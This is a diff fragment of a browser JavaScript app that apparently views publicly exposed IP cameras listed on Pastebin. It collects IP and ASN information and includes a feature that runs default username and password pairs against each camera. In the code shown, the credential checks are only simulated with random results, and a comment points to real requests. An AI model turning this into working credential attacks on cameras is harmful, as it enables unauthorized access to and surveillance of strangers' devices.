+            // Show notification
+            showNotification('<i class="fas fa-unlock"></i> Credential test successful!', 'success');
+        } else {
+            resultItem.className = 'test-result-item test-result-failure';
+            resultItem.innerHTML = `<i class="fas fa-times-circle"></i> <strong>${credential.username}:${credential.password}</strong> - Authentication failed`;
+        }
+    }, 1500);
+};
+
+// Function to test all credentials
+const testAllCredentials = (windowElement, metadata) => {
+    if (!windowElement || !metadata) return;
+
+    const credentials = metadata.authInfo.defaultCredentials;
+    if (!credentials || credentials.length === 0) return;
+
+    const testProgress = windowElement.querySelector('.test-progress');
+    const progressFill = windowElement.querySelector('.progress-fill');
+    const progressText = windowElement.querySelector('.progress-text');
+    const testResultsContainer = windowElement.querySelector('.test-results');
+    const testResultsContent = windowElement.querySelector('.test-results-content');
+
+    if (!testProgress || !progressFill || !progressText || !testResultsContainer || !testResultsContent) return;
+
+    // Show progress and results containers
+    testProgress.style.display = 'block';
+    testResultsContainer.style.display = 'block';
+
+    // Clear previous results
+    testResultsContent.innerHTML = '';
+
+    // Add header for this test run
+    const testHeader = document.createElement('div');
+    testHeader.style.marginBottom = '10px';
+    testHeader.style.fontWeight = 'bold';
+    testHeader.innerHTML = `<i class="fas fa-clock"></i> Test started at ${new Date().toLocaleTimeString()}`;
+    testResultsContent.appendChild(testHeader);
+
+    // Initialize progress
+    let currentIndex = 0;
+    const totalCredentials = credentials.length;
+
+    // Update progress text
+    progressText.textContent = `Testing credentials (0/${totalCredentials})`;
+
+    // Function to test next credential
+    const testNext = () => {
+        if (currentIndex >= totalCredentials) {
+            // All done
+            progressText.textContent = `Testing complete (${totalCredentials}/${totalCredentials})`;
+            showNotification('<i class="fas fa-check-circle"></i> Credential testing complete', 'success');
+            return;
+        }
+
+        const credential = credentials[currentIndex];
+
+        // Update progress
+        const progress = ((currentIndex + 1) / totalCredentials) * 100;
+        progressFill.style.width = `${progress}%`;
+        progressText.textContent = `Testing credentials (${currentIndex + 1}/${totalCredentials})`;
+
+        // Create result item
+        const resultItem = document.createElement('div');
+        resultItem.className = 'test-result-item testing-animation';
+        resultItem.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Testing ${credential.username}:${credential.password}...`;
+        testResultsContent.appendChild(resultItem);
+
+        // Scroll to bottom of results
+        testResultsContent.scrollTop = testResultsContent.scrollHeight;
+
+        // Simulate credential testing (in a real implementation, this would make actual requests)
+        setTimeout(() => {
+            // Random success/failure for demo purposes
+            const success = Math.random() > 0.7;
+
+            if (success) {
+                resultItem.className = 'test-result-item test-result-success';
+                resultItem.innerHTML = `<i class="fas fa-check-circle"></i> <strong>${credential.username}:${credential.password}</strong> - Authentication successful!`;
+            } else {
+                resultItem.className = 'test-result-item test-result-failure';
+                resultItem.innerHTML = `<i class="fas fa-times-circle"></i> <strong>${credential.username}:${credential.password}</strong> - Authentication failed`;
+            }
+
+            // Move to next credential
+            currentIndex++;
+            testNext();
+        }, 1000);
+    };
+
+    // Start testing
+    testNext();
+};
+
+// Initialization
+const init = () => {
+    try {
+        // Initialize DOM elements
+        DOM.init();
+
+        // Make sidebar draggable if it exists
+        const sidebar = DOM.get('sidebar');
+        const sidebarTitlebar = sidebar?.querySelector('.window-titlebar');
+        if (sidebar && sidebarTitlebar) {
+            makeDraggable(sidebar, sidebarTitlebar);
+            setupWindowControls(sidebar);
+        } else {
+            console.warn('Sidebar or titlebar not found');
+        }
+
+        // Setup initial state
+    updateCameraCount();
+    updateClock();
+
+        // Start clock update interval
+        const clockInterval = setInterval(updateClock, 60000);
+
+    // Load cameras from Pastebin
+        updateCameraListFromPastebin(API_ENDPOINTS.PASTEBIN)
+            .catch(error => {
+                console.error('Failed to load camera list:', error);
+                showNotification('<i class="fas fa-exclamation-triangle"></i> Failed to load camera list', 'error');
+            });
+
+    // Setup advanced mode button
+        const advancedModeButton = DOM.get('advancedModeButton');
+        if (advancedModeButton) {
+            advancedModeButton.addEventListener('click', openAdvancedDashboard);
+    }
+
+        // Remove any existing overlay
+    removeOverlay();
+
+    // Setup observer to remove overlay if added
+    const observer = new MutationObserver(() => {
+        removeOverlay();
+    });
+
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+
+        // Store cleanup functions
+        const cleanup = () => {
+            clearInterval(clockInterval);
+            observer.disconnect();
+            // Clean up any active resize observers
+            Object.values(globalState.resizeObservers).forEach(observer => {
+                if (observer.observer) observer.observer.disconnect();
+                if (observer.timeout) clearTimeout(observer.timeout);
+            });
+            globalState.resizeObservers = {};
+        };
+
+        // Add cleanup on page unload
+        window.addEventListener('unload', cleanup);
+
+    console.info('Application initialized successfully');
+        return true;
+    } catch (error) {
+        console.error('Failed to initialize application:', error);
+        return false;
+    }
+};
+
+// Initialize application when DOM is ready
+if (document.readyState === 'loading') {
+document.addEventListener('DOMContentLoaded', init);
+} else {
+    init();
+}
+
+// Close video window function
+const closeVideoWindow = (windowElement) => {
+    if (!windowElement) return;
+
+    const windowId = windowElement.dataset.id;
+    if (windowId) {
+        // Remove from active windows
+        const index = globalState.activeWindows.indexOf(windowId);
+        if (index > -1) {
+            globalState.activeWindows.splice(index, 1);
+        }
+
+        // Clean up resize observer if it exists
+        if (globalState.resizeObservers[windowId]) {
+            globalState.resizeObservers[windowId].disconnect();
+            delete globalState.resizeObservers[windowId];
+        }
+
+        // Clean up MJPG player intervals
+        const mjpgPlayer = windowElement.querySelector('.mjpg-image-container, .mjpg-iframe-container');
+        if (mjpgPlayer && mjpgPlayer.cleanup) {
+            mjpgPlayer.cleanup();
+        }
+
+        // Clean up raw data
+        if (globalState.rawData.ipInfo[windowId]) {
+            delete globalState.rawData.ipInfo[windowId];
+        }
+        if (globalState.rawData.asnInfo[windowId]) {
+            delete globalState.rawData.asnInfo[windowId];
+        }
+        if (globalState.rawData.metadata[windowId]) {
+            delete globalState.rawData.metadata[windowId];
+        }
+    }
+
+    // Remove from DOM
+    windowElement.remove();
+
+    // Update dashboard if in advanced mode
+    if (globalState.advancedMode) {
+        updateDashboardContent();
+        populateCurrentIpSelector();
+    }
+};
+
+// Expose some functions to global scope for HTML onclick handlers
+window.openTab = openTab;
+window.closeVideoWindow = closeVideoWindow;
+
+// Tab navigation function for old code compatibility
+function openTab(evt, tabName) {
+    const tabcontent = document.getElementsByClassName('tabcontent');
+    for (let i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = 'none';
+    }
+
+    const tablinks = document.getElementsByClassName('tablinks');
+    for (let i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(' active', '');
+    }
+
+    document.getElementById(tabName).style.display = 'block';
+    evt.currentTarget.className += ' active';
+}
+
+// Setup metadata extraction button
+const setupMetadataExtraction = (windowElement) => {
+    console.log('[setupMetadataExtraction] Setting up metadata extraction for window:', windowElement);
+
+    if (!windowElement) {
+        console.error('[setupMetadataExtraction] Window element is null or undefined');
+        return;
+    }
+
+    // Find the extract metadata button
+    const extractButton = windowElement.querySelector('.extract-metadata-btn');
+    console.log('[setupMetadataExtraction] Extract button found:', extractButton);
+
+    if (!extractButton) {
+        console.error('[setupMetadataExtraction] Extract metadata button not found in window');
+        return;
+    }
+
+    // Remove any existing event listeners by cloning the button
+    const newButton = extractButton.cloneNode(true);
+    extractButton.parentNode.replaceChild(newButton, extractButton);
+
+    // Add event listener to the new button
+    newButton.addEventListener('click', (event) => {
+        event.preventDefault();
+        console.log('[setupMetadataExtraction] Extract metadata button clicked');
+
+        // Show loading indicator
+        const loadingIndicator = windowElement.querySelector('.metadata-loading');
+        if (loadingIndicator) {
+            loadingIndicator.style.display = 'flex';
+        }
+
+        try {
+            // Call the metadata extraction function
+            console.log('[setupMetadataExtraction] Calling extractCameraMetadata');
+            const result = extractCameraMetadata(windowElement);
+            console.log('[setupMetadataExtraction] Metadata extraction result:', result);
+
+            // Show notification based on result
+            if (result.success) {
+                showNotification('Metadata extraction completed successfully', 'success');
+            } else {
+                showNotification(`Metadata extraction failed: ${result.error}`, 'error');
+            }
+        } catch (error) {
+            console.error('[setupMetadataExtraction] Error during metadata extraction:', error);
+            showNotification(`Error during metadata extraction: ${error.message}`, 'error');
+        } finally {
+            // Hide loading indicator
+            if (loadingIndicator) {
+                loadingIndicator.style.display = 'none';
+            }
+        }
+    });
+
+    console.log('[setupMetadataExtraction] Event listener added to extract metadata button');
+};
+
+// Function to test all credentials
